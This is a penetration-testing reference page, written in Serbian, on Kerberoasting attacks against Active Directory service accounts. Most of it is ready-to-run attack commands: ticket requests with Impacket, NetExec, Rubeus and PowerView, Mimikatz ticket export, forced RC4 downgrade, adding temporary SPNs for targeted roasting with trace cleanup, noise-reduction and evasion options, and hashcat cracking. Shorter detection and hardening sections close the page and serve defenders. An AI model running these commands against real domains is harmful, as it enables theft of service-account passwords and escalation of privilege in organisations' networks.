# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na pribavljanje TGS tiketa, konkretno onih povezanih sa servisima koji rade pod korisničkim nalozima u Active Directory (AD), izuzimajući računarske naloge. Za šifrovanje ovih tiketa koriste se ključevi izvedeni iz korisničkih lozinki, što omogućava offline razbijanje akreditiva. Korišćenje korisničkog naloga kao servisnog označava se nepraznim svojstvom ServicePrincipalName (SPN).

Svaki autentifikovani korisnik domena može da zatraži TGS tikete, tako da nisu potrebne posebne privilegije.<sup>[[4]](#references)[[5]](#references)</sup>

### Ključne tačke

- Cilj su TGS tiketi za servise koji rade pod korisničkim nalozima (tj. nalozima sa podešenim SPN-om; ne računarskim nalozima).
- Tiketi su šifrovani ključem izvedenim iz lozinke servisnog naloga i mogu se razbijati offline.
- Nisu potrebne povišene privilegije; svaki autentifikovani nalog može da zatraži TGS tikete.

> [!WARNING]
> Većina javnih alata podrazumevano traži servisne tikete RC4-HMAC (etype 23), jer se brže razbijaju od AES tiketa. RC4 TGS hash-evi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnoga okruženja prelaze na isključivo AES. Nemojte pretpostavljati da je relevantan samo RC4.
> Takođe, izbegavajte „spray-and-pray“ roasting. Rubeus kerberoast po podrazumevanim podešavanjima može da upita i zatraži tikete za sve SPN-ove, što je bučno. Prvo nabrojte i odaberite zanimljive principale kao mete.

### Tajne servisnih naloga i cena Kerberos kriptografije

Mnogi servisi i dalje rade pod korisničkim nalozima sa ručno upravljanim lozinkama. KDC šifruje servisne tikete ključevima izvedenim iz tih lozinki i predaje šifrat svakom autentifikovanom principalu, pa kerberoasting omogućava neograničen broj offline pokušaja pogađanja, bez zaključavanja naloga ili telemetrije sa DC-a. Režim šifrovanja određuje budžet za razbijanje:

| Režim | Izvođenje ključa | Tip šifrovanja | Približna propusnost RTX 5090* | Napomene |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 sa 4,096 iteracija i saltom po principalu, generisanim iz domena + SPN-a | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 miliona pokušaja/s | Salt sprečava rainbow tabele, ali i dalje omogućava brzo razbijanje kratkih lozinki. |
| RC4 + NT hash | Jedan MD4 izračun lozinke (nesaltovani NT hash); Kerberos dodaje samo 8-bajtni confounder po tiketu | etype 23 (`$krb5tgs$23$`) | ~4.18 **milijardi** pokušaja/s | ~1000× brže od AES-a; napadači forsiraju RC4 kad god `msDS-SupportedEncryptionTypes` to dozvoljava. |

*Rezultati benchmark testova Chick3nman-a, navedeni u [analizi Kerberoasting napada autora Matthewa Greena](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder u RC4 samo nasumično menja tok ključa; ne povećava cenu svakog pokušaja. Osim ako servisni nalozi koriste nasumične tajne (gMSA/dMSA, računarske naloge ili stringove kojima se upravlja u trezoru), brzina kompromitovanja zavisi isključivo od GPU resursa. Nametanje isključivo AES tipova šifrovanja uklanja mogućnost snižavanja na milijardu pokušaja u sekundi, ali slabe ljudske lozinke i dalje mogu da се razbiju uz PBKDF2.<sup>[[3]](#references)</sup>

### Napad

#### Linux

Praktičan primer od početka do kraja koji koristi NetExec za traženje roastable tiketa i Hashcat za njihovo razbijanje dostupan je u referenci [1].<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Alati sa više funkcija koji uključuju kerberoast provere:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Izlistajte kerberoastable korisnike

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Tehnika 1: Zatražite TGS i dump iz memorije

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Tehnika 2: Automatski alati

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> TGS zahtev generiše Windows Security Event 4769 (Zatražen je Kerberos service ticket).

### OPSEC i okruženja koja koriste samo AES

- Namerno zatražite RC4 za naloge bez AES-a:
  - Rubeus: `/rc4opsec` koristi tgtdeleg da izlista naloge bez AES-a i zatraži RC4 service tickets.
  - Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve kada je to moguće.<sup>[[6]](#references)</sup>
- Roast-ujte naloge koji koriste samo AES umesto da zahtev neprimetno ne uspe:
  - Rubeus: `/aes` izlistava naloge sa omogućenim AES-om i zahteva AES service tickets (etype 17/18).
  - Ako već imate TGT (PTT ili iz .kirbi datoteke), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Ciljanje, ograničavanje učestalosti zahteva i manje šuma:
  - Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
  - Filtrirajte naloge za koje je verovatna slaba lozinka pomoću `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili ciljajte privilegovane OU-ove pomoću `/ou:<DN>`.<sup>[[8]](#references)</sup>

Primeri (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Postojanost / zloupotreba

Ako kontrolišete nalog ili možete da ga izmenite, možete ga učiniti kerberoastable dodavanjem SPN-a:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Vratite nalog na slabiju konfiguraciju da biste omogućili RC4 radi lakšeg cracking-a (zahteva dozvole za pisanje nad ciljnim objektom):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast preko GenericWrite/GenericAll nad korisnikom (privremeni SPN)

Kada BloodHound pokaže da imate kontrolu nad objektom korisnika (npr. GenericWrite/GenericAll), možete pouzdano da izvršite „targeted roast“ nad tim konkretnim korisnikom, čak i ako trenutno nema SPN-ove:<sup>[[9]](#references)</sup>

- Dodajte privremeni SPN kontrolisanom korisniku da bi mogao da se roast-uje.
- Zatražite TGS-REP šifrovan pomoću RC4 (etype 23) za taj SPN da biste olakšali cracking.
- Crack-ujte hash `$krb5tgs$23$...` pomoću hashcat-a.
- Uklonite SPN da biste smanjili tragove.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux jednolinijska komanda (targetedKerberoast.py automatizuje dodavanje SPN-a -> zahtevanje TGS-a (etype 23) -> uklanjanje SPN-a):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Crack-uj izlaz pomoću hashcat autodetect-a (mode 13100 za `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Napomene o detekciji: dodavanje/uklanjanje SPN-ova dovodi do promena u direktorijumu (Event ID 5136/4738 na ciljnom korisniku), a TGS zahtev generiše Event ID 4769. Razmotrite ograničavanje učestalosti i brzo čišćenje.

Korisne alate za kerberoast napade možete pronaći ovde: https://github.com/nidem/kerberoast

Ako na Linuxu naiđete na ovu grešku: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, uzrok je odstupanje lokalnog vremena. Sinhronizujte vreme sa DC-om:

- `ntpdate <DC_IP>` (zastareo na nekim distribucijama)
- `rdate -n <DC_IP>`

### Kerberoast bez naloga domena (AS-requested STs)

U septembru 2022. Charlie Clark je pokazao da je, ako principal ne zahteva preautentifikaciju, moguće dobiti tiket usluge pomoću posebno sastavljenog KRB_AS_REQ zahteva, menjanjem sname polja u telu zahteva. Time se efektivno dobija tiket usluge umesto TGT-a. Ovaj postupak je sličan AS-REP roastingu i ne zahteva važeće akreditive domena.

Pogledajte detalje: Semperisov članak „Novi putevi napada: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Morate da navedete listu korisnika jer bez važećih akreditiva ne možete da postavljate upite LDAP-u ovom tehnikom.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Povezano

Ako ciljate korisnike ranjive na AS-REP roasting, pogledajte i:

{{#ref}}
asreproast.md
{{#endref}}

### Otkrivanje

Kerberoasting može biti prikriven. Tražite Event ID 4769 sa DC-ova i primenite filtere da biste smanjili šum:

- Isključite naziv usluge `krbtgt` i nazive usluga koji se završavaju znakom `$` (računari).
- Isključite zahteve sa mašinskih naloga (`*$$@*`).
- Uključite samo uspešne zahteve (Failure Code `0x0`).
- Pratite tipove šifrovanja: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Nemojte upozoravati samo na `0x17`.

Primer PowerShell trijaže:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Dodatne ideje:

- Utvrdite uobičajenu osnovnu upotrebu SPN-a po hostu/korisniku; aktivirajte upozorenje na veliki broj različitih zahteva za SPN od jednog principal-a.
- Označite neuobičajenu upotrebu RC4 u domenima ojačanim AES-om.

### Ublažavanje / Ojačavanje

- Koristite gMSA/dMSA ili naloge računara za servise. Upravljani nalozi imaju nasumične lozinke dužine 120+ znakova koje se automatski menjaju, zbog čega je offline cracking nepraktičan.<sup>[[7]](#references)</sup>
- Nametnite AES na servisnim nalozima tako što ćete postaviti `msDS-SupportedEncryptionTypes` samo na AES (decimalno 24 / heksadecimalno 0x18), a zatim promeniti lozinku kako bi se izveli AES ključevi.<sup>[[7]](#references)</sup>
- Gde je moguće, onemogućite RC4 u svom okruženju i nadgledajte pokušaje njegove upotrebe. Na DC-ovima možete koristiti vrednost registra `DefaultDomainSupportedEncTypes` da biste usmerili podrazumevane vrednosti za naloge kojima nije postavljen `msDS-SupportedEncryptionTypes`. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove sa korisničkih naloga.<sup>[[7]](#references)</sup>
- Koristite duge, nasumične lozinke za servisne naloge (25+ znakova) ako upotreba upravljanih naloga nije moguća; zabranite uobičajene lozinke i redovno sprovodite reviziju.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking u praksi](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: napadi sa malim tehničkim zahtevima i velikim uticajem pomoću zastarele Kerberos kriptografije (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Zloupotreba Kerberos-a u Active Directory-ju: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Zahtevanje TGS-a šifrovanog RC4 algoritmom kada je AES omogućen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft-ove smernice za ublažavanje Kerberoasting napada](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – dokumentacija za komandu Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL akreditivi → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Nove putanje napada? Zahtevani servisni tiketi (Charlie Clark, septembar 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
